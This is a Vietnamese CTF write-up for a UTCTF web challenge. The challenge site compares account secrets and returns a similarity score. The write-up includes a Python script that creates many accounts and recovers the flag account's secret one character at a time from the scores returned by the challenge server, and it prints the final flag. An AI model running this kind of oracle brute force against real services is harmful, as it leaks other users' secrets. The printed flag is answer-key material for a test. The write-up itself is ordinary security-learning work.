![image](https://github.com/user-attachments/assets/26d93f95-ce2b-4fc3-84d1-461839c2aacb)

Đề bài cho một trang web có các chức năng sau

- Tạo một tài khoản và 1 secret với tài khoản đó (Sign up)
- So sánh sự giống nhau của secret giữa 2 tài khoản (Look up a specific pairing)
- Liệt kê list các tài khoản có secret gần với tài khoản đang tìm kiếm nhất (Check your top matches)

Thực hiện tạo 2 tài khoản `user1`, và `user2` đều có secret là `abc` và so sánh sự giống nhau, kết quả là 0 do 2 tài khoản này có secret giống nhau
![image](https://github.com/user-attachments/assets/933c79b8-578b-4f7c-aaea-a40c214316d1)

Thực hiện so sánh `user1` với  `user3` có secret là `xyz` thì nhận được:
![image](https://github.com/user-attachments/assets/1a610edc-2e6b-48be-b353-4fbbc0cf8f08)

Nếu secret càng giống nhau thì paring giữa 2 tài khoản càng nhỏ, khi bằng 0 thì secret của 2 tài khoản giống nhau. Trong hệ thống có tài khoản flag, secret của tài khoản này chính là flag của bài, thực hiện viết script để bruteforce secret của tài khoản này theo điểm paring với tài khoản flag.

```
import requests
import re
import string

# flag = 'utflag{On3_sT3P_4t_4_t1m3}'
flag = 'utflag{'
i = 1
while(1):
    mi = 99999999999
    flagi = 'a'
    for x in string.printable:
        user = f"ptit{i}"
        print(user, end = ' ')
        url = "http://challenge.utctf.live:3725/index.php"
        data1 = {
            "username": user,
            "password": flag + x
        }
        data2 = {
            "username1": "flag",
            "username2": user
        }

        headers = {
            "Host": "challenge.utctf.live:3725",
            "Cache-Control": "max-age=0",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "http://challenge.utctf.live:3725",
            "Content-Type": "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": "http://challenge.utctf.live:3725/index.php",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }
        requests.post(url, data=data1, headers=headers)
        response = requests.post(url, data=data2, headers=headers)

        # Trích xuất số từ đoạn văn bản phù hợp
        match = re.search("The pairing for flag and " + user + " is: (\d+)", response.text)
        try:
            otp = match.group(1)
            print(otp)
            otp = int(otp)
            if(otp < mi):
                mi = otp
                flagi = x
        except:
            print("Không tìm thấy OTP trong kết quả trả về.")
        i += 1
    flag += flagi
    print(flag)
```

> **Flag :** utflag{On3_sT3P_4t_4_t1m3}
